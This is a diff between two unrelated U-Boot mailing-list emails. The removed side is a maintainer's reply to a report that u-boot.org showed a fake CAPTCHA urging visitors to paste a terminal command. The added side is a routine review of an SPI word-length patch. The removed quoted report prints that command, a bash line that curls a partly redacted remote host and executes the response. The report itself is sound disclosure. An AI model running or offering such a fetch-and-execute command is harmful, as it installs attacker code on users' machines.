@@ -4,95 +4,99 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id A2836EC1117
-	for <u-boot@archiver.kernel.org>; Mon, 23 Feb 2026 17:51:23 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 66CEFEC1117
+	for <u-boot@archiver.kernel.org>; Mon, 23 Feb 2026 17:51:31 +0000 (UTC)
 Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
-	by phobos.denx.de (Postfix) with ESMTP id 1F0A483C6E;
-	Mon, 23 Feb 2026 18:51:19 +0100 (CET)
+	by phobos.denx.de (Postfix) with ESMTP id 4533782BF2;
+	Mon, 23 Feb 2026 18:51:27 +0100 (CET)
 Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=chromium.org
 Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
 Authentication-Results: phobos.denx.de;
-	dkim=pass (1024-bit key; unprotected) header.d=chromium.org header.i=@chromium.org header.b="WZA28Rr+";
+	dkim=pass (1024-bit key; unprotected) header.d=chromium.org header.i=@chromium.org header.b="leJ0y5qN";
 	dkim-atps=neutral
 Received: by phobos.denx.de (Postfix, from userid 109)
- id BCE2F83DAE; Mon, 23 Feb 2026 18:51:17 +0100 (CET)
-Received: from mail-ed1-x530.google.com (mail-ed1-x530.google.com
- [IPv6:2a00:1450:4864:20::530])
+ id CD7F283E40; Mon, 23 Feb 2026 18:51:23 +0100 (CET)
+Received: from mail-ed1-x534.google.com (mail-ed1-x534.google.com
+ [IPv6:2a00:1450:4864:20::534])
  (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
  (No client certificate requested)
- by phobos.denx.de (Postfix) with ESMTPS id 8E3CF80077
- for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 18:51:15 +0100 (CET)
+ by phobos.denx.de (Postfix) with ESMTPS id D327A83DEA
+ for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 18:51:20 +0100 (CET)
 Authentication-Results: phobos.denx.de;
  dmarc=pass (p=none dis=none) header.from=chromium.org
 Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=sjg@chromium.org
-Received: by mail-ed1-x530.google.com with SMTP id
- 4fb4d7f45d1cf-65baa72399fso6105911a12.0
- for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 09:51:15 -0800 (PST)
-ARC-Seal: i=1; a=rsa-sha256; t=1771869075; cv=none;
+Received: by mail-ed1-x534.google.com with SMTP id
+ 4fb4d7f45d1cf-65c20dc9577so8649874a12.2
+ for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 09:51:20 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1771869080; cv=none;
  d=google.com; s=arc-20240605;
- b=Z9QE9QA+bzwdq96D6dDyUWpBGWv5dD7H+M7gpyZiOG0mpDlS1zUaP2ctopvN5tQuc3
- FrEf8P+5m7d4LAbfT8XffLrDG1JqeFP4BCrWgU/7xfkXF9mMbcDzyOx+TaMAD4fTozyE
- KysCgjS19BXL3rGAfRw0KU32oGbQ78o/+rmWJ7kPYvQ0O2xobtxOE+C127lnPPf4jpj9
- qd9uCBcG9XK4vV6cNN1s/3gub6vj5AV+QwmcehkGdMQFgBZiAkgc3u/IQVG9s0ncZ4XC
- UJLD2nbINuL0u017e3QD8Wr5YkscF1YCNIBFeHh10pIZNfOI9QwUQtKNNsVhMKK/bseE
- O+9g==
+ b=aD37mWeea64RaWu2pA+8+HsSduy64tcPQjshElc7zdF2uKoVS83I6UqUWvshvrn5xt
+ sPjQKm3GF/VhVG7jyhPwf+Ba8s8YCTgEKDvB/BwQNNHSBTxajYGgy6eZVgF85vkR0adF
+ PFm01lWlooSCvVnqT18qKsKU9vJ78tneLCnPi5C/zz4wa731s4OSxgWenIWBtn7Rp+XS
+ 8M+Ajj84EzpeNOIpzo2lj2Q3Q/RlN40qPUvmOBFbjfgxk1sm9qATQEI4/MYANLQmXgMi
+ 1UoXHAkApGEULWJfdopseDbiY7PabCxhizBs+k4nPxMlqWR+o4efjMTFI6m3HKzLkwoN
+ URqw==
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com;
  s=arc-20240605; 
- h=content-transfer-encoding:cc:to:subject:message-id:date:from
- :in-reply-to:references:mime-version:dkim-signature;
- bh=OsssbHSMNxjtli7Km/HBqwcngJoqnI4yZUFd5hQozx8=;
- fh=Bw3R32rnTkQn8vvgFY5nSfDbdPWtZG0eQfExQZmr/OM=;
- b=bM334FV8HOSyZKt4LIMSRDJFnJK89FW4bvk2W2VqI3uB7EsVvNYyacWYGmgxfHLLwx
- fk7P6iDzDfaEeoGAnl3BV8JuGHmIvrqCCvj8O6+hbtl5weyYnbHhwjf2dvSYnvSau7pd
- uMSTd/rlTXZ/DVXwS6rc6AyRoC3JnZ16xPVDnX0QNvmsSn0BCby9qu50K4cqS43xtnVz
- kpVyUc69t/iQfLX2EXpMgKhFOXZ9oVgK5k8Pj1DKh8q8X5oxAxqqC1MRjBXHqRN0vISq
- T440rzNT5GiYf/gdLn/FEF1sgivC2iVIhXN8OeOebL/5o4gwhL8sNMShukOfqsj8ZR2e
- 3ZGg==; darn=lists.denx.de
+ h=cc:to:subject:message-id:date:from:in-reply-to:references
+ :mime-version:dkim-signature;
+ bh=n+Fj+FKZr/f02YWjYyijShcHgsbPR+TU5q9V+rbFSUk=;
+ fh=GWWGynSCQ6whjMxEhi67LRdRPreleBh5K9aBxP67Sp4=;
+ b=KpiQ7j+k9+mfuX7zK5eheqEXjbUMLrvf+xPygfs0SNGisw6KFl1vfeGaUw+IOyTuN9
+ 4tM1O9+I444KzVCOf0durRxPCm3vpudrSWFd8KaXwyj02mVJ0mxo/TEWMrdyuVlUFM5b
+ 8Lh667QFUa9G+y1uhpk5U30JlxpYP0L+vGw99EenveSv29j+mee/Z5lZKbFLTPr7GUjM
+ pRQqPD0h2ZOiaAESh7CmU6W3Y2DKDsAm6IwNxO7d3vV1mJLibCqEdKd4tznHleOi9Bmc
+ 56mEZHL4End4aZOXLMdmpIWmSx2aHOnndu4tIAcwpaCmIjd8M4NcK/E8SojEmepCjd93
+ JXXQ==; darn=lists.denx.de
 ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=chromium.org; s=google; t=1771869075; x=1772473875; darn=lists.denx.de;
- h=content-transfer-encoding:cc:to:subject:message-id:date:from
- :in-reply-to:references:mime-version:from:to:cc:subject:date
- :message-id:reply-to;
- bh=OsssbHSMNxjtli7Km/HBqwcngJoqnI4yZUFd5hQozx8=;
- b=WZA28Rr+pfjCOYYYx9CHC9iNEGDACKBo2dNlVrRNkCKpmTcl95NMLxxz1iKz/Jokkz
- 1WEaqiPAAxDIzJBwC6CWn6U7jJIzPiZt2W92qxV+FbovG+5iT5UXgiWlG7Fctpy4z507
- Q8xe21iF+Fx3KW7GdNBgbJXxmMbiMsY5lYW74=
+ d=chromium.org; s=google; t=1771869080; x=1772473880; darn=lists.denx.de;
+ h=cc:to:subject:message-id:date:from:in-reply-to:references
+ :mime-version:from:to:cc:subject:date:message-id:reply-to;
+ bh=n+Fj+FKZr/f02YWjYyijShcHgsbPR+TU5q9V+rbFSUk=;
+ b=leJ0y5qNJlf53CNDT0jyH4sibcROxXo1quHww/8GpWuJxQRLgSle4bskEgHuZKZ5Sp
+ gyPkPW0jPOhh7qjRcojM3YOmpXdVHbRCsfGktZtrrq9fC/W8UG6vProIzexxnWQ3BXMC
+ ZoZo3Z1+CuS/B51Ch3g1nDrKvnBP+AzjAjOM8=
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1771869075; x=1772473875;
- h=content-transfer-encoding:cc:to:subject:message-id:date:from
- :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
- :to:cc:subject:date:message-id:reply-to;
- bh=OsssbHSMNxjtli7Km/HBqwcngJoqnI4yZUFd5hQozx8=;
- b=iv+/I/yVjrV1Zuh5Fa2tklPLmfg8510RU1hb8kiIaoZdTIDNFiOzRb+6VI9B+kS44m
- 1pNKJIU6vmPjZrsHaqLBYHUHoXq9ImxzfaMejw7Virmc9SE7k8VxLG6KjJuVGTQhKNvI
- 0achLkvTZRqed0D/1spdpuqZh0I/Nz7yku38s5QHSWrCxeojsBwbxgn2Iqx/T2EfwfXM
- xYZigKTKgj3b5d/JYi0JhOTkZguIeedOHfdL/3guE77fA4c4vtUqGcfzlSwIsm0V/xmM
- JtJ6ybsTlrSXtqBiL9uUxOunpxJKYAwoeQxeRs8EbwkhYNqCtlqw7yxUGVULKU8cEiNF
- xQ8g==
-X-Gm-Message-State: AOJu0YwFqoQH1odD1qtbDK5iAxFVqjfOUvQZnV8A8Qbj7Tawj88HdDJ1
- WdQVsxxsoAJlNypM4mIPr6L6e7C/BZnTCz3sEmGQNXOo5CyuZaR9TZvtqCZrwTPxOQPh7FWf2G8
- YU4mmPlRLah13fQgCE4rAhnH2Ob2Wyu7kC1+V9QfK7Nhr/PyEIF0=
-X-Gm-Gg: ATEYQzyam3ASlmM7pPe6GvxgsJsrPQyIoSjFUu5x3Jwmm/4Dxbwoo3y/OCWjLKcpcSt
- vNItj/bdAlmHrOrGkHV1ursMNyZ2dKZ9nOWrvuRpHRYzP/hfXykylZXa0o3qNm3m+zHLZ4uSMHd
- PfMCwGMtcFc4nWZLt8Ygmzt1luOcmg90ZpsIjiBqDwfdCMN3eM5ojl6hZIf/A1US9+NxYPIT6y4
- mvcak9Yp4DFdw7cwZYzO+UwT2k0ffLOOFzvXQVnZVSu1YkEcQmTwBE3sV+jBo154oLHV+SYIeSm
- 6AmOMw==
-X-Received: by 2002:a05:6402:50d2:b0:658:c1b0:1501 with SMTP id
- 4fb4d7f45d1cf-65ea4f0ae39mr5178939a12.31.1771869074950; Mon, 23 Feb 2026
- 09:51:14 -0800 (PST)
+ d=1e100.net; s=20230601; t=1771869080; x=1772473880;
+ h=cc:to:subject:message-id:date:from:in-reply-to:references
+ :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+ :message-id:reply-to;
+ bh=n+Fj+FKZr/f02YWjYyijShcHgsbPR+TU5q9V+rbFSUk=;
+ b=AO7Ig29SaYme+h11iZeX4Fb9PlDpAjuE8NoksdOm2TYohTAFAoREfBo2pui02ngvSG
+ S5vjran9/06D9sTMquAbwRKryM3zhVF7SBZ6LOy8KNYPIitQQWvAF0JOhblqA4+9GjL6
+ 8EuLrNOdZtscV7OcPhfOy1qWo2vxyx3hN9tj6TjuzL1WJcygXtbiaB9LqLC1jRe3InIt
+ pkRsFmaQ5V92J2jb1V/AlXtoQ+/TFSBCmRCdlrGe+fhAlDRqqSQ+i7ikpooTYIPuAzsq
+ kOV4lX9e7lMlzopKGVhnAn3MbghTO/Nq8AToiSZd99JDW2h59sIC78GNFpJx0hb0CRc2
+ fhPA==
+X-Gm-Message-State: AOJu0YymPa9CbpwKlHh1AhNKor1+xhdP7KzzbZKXnaUQzyKUGzONs2vd
+ Xx2pvnHuTvuLxUQ2iP43kGCfWy434gl3aIYqfl5Y8Q8hZ/luqUw6ZeAYMFvs0XYcoc9fFms/MuD
+ o8xgNFRr9ovnbuL/CoAilZXw7eM9e8KDp9DNkO+Pt
+X-Gm-Gg: ATEYQzxE1idLZDxifnKd228jGk0rENuXLS1SRtR15JzcVbjUQgC3SdFgPJi1/AzrGcq
+ i+Jxqsn76U2f3Z4l07a7yIc8qwvA065jNonLQcNPeUlkV7Ajkmk5XTRd64mR9QckZIP7AR93/AS
+ eJ73dda62Q9v4t+XRHzDfnmmy2B1dPjDA9WySShw05kwWL08Pg5NQqCvM9vntXY9jDDKoMCQElB
+ Xav6FZHE4osI+q0p48Dob+HQTlqvjVGaJ8yZotclCWtY79hWE7/KpvyywTl7IIqYoY9cOCHQSdu
+ aE3RYQ==
+X-Received: by 2002:a05:6402:f18:b0:659:4b76:74f4 with SMTP id
+ 4fb4d7f45d1cf-65ea4f1a583mr3962881a12.16.1771869080183; Mon, 23 Feb 2026
+ 09:51:20 -0800 (PST)
 MIME-Version: 1.0
-References: <086E4FCB-379D-491A-A6DB-3CDC48775680@mkukri.xyz>
-In-Reply-To: <086E4FCB-379D-491A-A6DB-3CDC48775680@mkukri.xyz>
+References: <20260221094252.3103034-1-dario.binacchi@amarulasolutions.com>
+ <20260221094252.3103034-2-dario.binacchi@amarulasolutions.com>
+In-Reply-To: <20260221094252.3103034-2-dario.binacchi@amarulasolutions.com>
 From: Simon Glass <sjg@chromium.org>
-Date: Mon, 23 Feb 2026 10:51:00 -0700
-X-Gm-Features: AaiRm52aSqsbqfOJBEt-jZe8sKJ9N1UprPI8yDa6p6QYkBEBEwJSAeB6dAe_V9U
-Message-ID: <CAFLszThVSQZMKdrc2kwynso8K0cwj5TjZtAatASGLU4RQ1pFcA@mail.gmail.com>
-Subject: Re: U-boot.org is spreading malware
-To: Mate Kukri <km@mkukri.xyz>
-Cc: u-boot@lists.denx.de
+Date: Mon, 23 Feb 2026 10:51:02 -0700
+X-Gm-Features: AaiRm5272kTLBkLjv6sE-0LdZqjQi1SrrxAw7406UxPifJv6UWhStKAfsOXWzdE
+Message-ID: <CAFLszTjy3zaNGjThFxr+SzfpjhVEE38ycGGA0SP4mwLBr_XnJw@mail.gmail.com>
+Subject: Re: [PATCH v2 1/8] spi: add support for bits-per-word setting
+To: Dario Binacchi <dario.binacchi@amarulasolutions.com>
+Cc: u-boot@lists.denx.de, Patrice Chotard <patrice.chotard@foss.st.com>, 
+ Patrick Delaunay <patrick.delaunay@foss.st.com>,
+ linux-amarula@amarulasolutions.com, 
+ Andrew Goodbody <andrew.goodbody@linaro.org>,
+ Christian Marangi <ansuelsmth@gmail.com>, 
+ Jagan Teki <jagan@amarulasolutions.com>, Tom Rini <trini@konsulko.com>
 Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
 X-BeenThere: u-boot@lists.denx.de
 X-Mailman-Version: 2.1.39
 Precedence: list
@@ -109,36 +113,111 @@ Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
 X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
 X-Virus-Status: Clean
 
-Hi Mate,
+Hi Dario,
 
-On Mon, 23 Feb 2026 at 03:02, Mate Kukri <km@mkukri.xyz> wrote:
+On Sat, 21 Feb 2026 at 02:43, Dario Binacchi
+<dario.binacchi@amarulasolutions.com> wrote:
 >
-> Dear Maintainers,
+> Allow dynamic configuration of the SPI word length. This is required
+> for controllers and slaves that need to operate with non-standard
+> word lengths, such as 9-bit wide transfers.
 >
-> U-Boot.org <http://u-boot.org/> seems to be trying to social engineer vis=
-itors into executing potentially malicious code.
+> Signed-off-by: Dario Binacchi <dario.binacchi@amarulasolutions.com>
+> ---
 >
-> The website presents a seemingly fake re-Captcha upon visiting, which aft=
-er ticking the box instructs the user to open their terminal and paste and =
-execute a command from the clipboard for =E2=80=9Cverification".
+> (no changes since v1)
 >
-> Said command curl-s some text from a network server and runs it as a bash=
- command.
+>  drivers/spi/spi-uclass.c | 19 +++++++++++++++++++
+>  include/spi.h            | 12 ++++++++++++
+>  2 files changed, 31 insertions(+)
 >
-> I have not done much analysis on the exact behaviour of the payload, but =
-social engineering users into executing arbitrary local payload is not an a=
-cceptable way of doing web visitor verification.
->
-> An example of the clipboard payload I am told to execute (but did not) is=
- (sub XXXXXXXX with microzen)
-> /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL 'tl5mltkq.XXXXXXXX.digit=
-al/?=3Dcheck&&actmn=3DgTGzPBzHSGwagnVq')"; echo ""BotGuard: Answer the prot=
-ector challenge. Ref: 15978
 
-Thanks for the report. An old wordpress account was compromised. It
-has been deleted and various measures have been put in place to ensure
-there is no repeat. We can share more detail privately to those
-interested.
+Reviewed-by: Simon Glass <simon.glass@canonical.com>
+
+Thoughts below
+
+> diff --git a/drivers/spi/spi-uclass.c b/drivers/spi/spi-uclass.c
+> index 49b584c648d6..a4a3b6c25b7d 100644
+> --- a/drivers/spi/spi-uclass.c
+> +++ b/drivers/spi/spi-uclass.c
+> @@ -91,6 +91,20 @@ void dm_spi_release_bus(struct udevice *dev)
+>                 ops->release_bus(dev);
+>  }
+>
+> +int dm_spi_set_wordlen(struct udevice *dev, unsigned int wordlen)
+> +{
+> +       struct udevice *bus = dev->parent;
+> +       struct dm_spi_ops *ops = spi_get_ops(bus);
+> +
+> +       if (bus->uclass->uc_drv->id != UCLASS_SPI)
+> +               return -EOPNOTSUPP;
+
+This should not happen, right? We don't normally include these kinds
+of checks in U-Boot, to avoid code-size costs.
+
+I have long thought about adding 'CONFIG_SAFE' option behind which we
+could hide checks, which people could then enable if they with:
+
+if (CONFIG_IS_ENABLED(SAFE) && bus && bus->uclass &&
+bus->uclass->uc_drv && bus->uclass->uc_drv->id != UCLASS_SPI)
+              return -[error number to use for all of these checks];
+
+(would need to check dev->parent and ops too)
+
+> +
+> +       if (!ops->set_wordlen)
+> +               return -ENOSYS;
+> +
+> +       return ops->set_wordlen(dev, wordlen);
+> +}
+> +
+>  int dm_spi_xfer(struct udevice *dev, unsigned int bitlen,
+>                 const void *dout, void *din, unsigned long flags)
+>  {
+> @@ -144,6 +158,11 @@ int spi_set_speed(struct spi_slave *slave, uint hz)
+>         return ret;
+>  }
+>
+> +int spi_set_wordlen(struct spi_slave *slave, unsigned int wordlen)
+> +{
+> +       return dm_spi_set_wordlen(slave->dev, wordlen);
+> +}
+> +
+>  int spi_xfer(struct spi_slave *slave, unsigned int bitlen,
+>              const void *dout, void *din, unsigned long flags)
+>  {
+> diff --git a/include/spi.h b/include/spi.h
+> index 2783200d663e..a92f54a7404b 100644
+> --- a/include/spi.h
+> +++ b/include/spi.h
+> @@ -729,6 +729,18 @@ int dm_spi_claim_bus(struct udevice *dev);
+>   */
+>  void dm_spi_release_bus(struct udevice *dev);
+>
+> +/**
+> + * Set the word length for SPI transactions
+> + *
+> + * Set the word length (number of bits per word) for SPI transactions.
+> + *
+> + * @slave:     The SPI slave
+> + * @wordlen:   The number of bits in a word
+> + *
+> + * Returns: 0 on success, -1 on failure.
+> + */
+> +int dm_spi_set_wordlen(struct udevice *dev, unsigned int wordlen);
+> +
+>  /**
+>   * SPI transfer
+>   *
+> --
+> 2.43.0
+>
+
+We should probably store the the wordlen in struct dm_spi_slave_plat
+
+We could even avoid a new operation, but then your driver would need
+to set the word on an xfer() call. Plis your new operation lines up
+with the existing ones. So this seems OK to me.
 
 Regards,
-SImon
+Simon
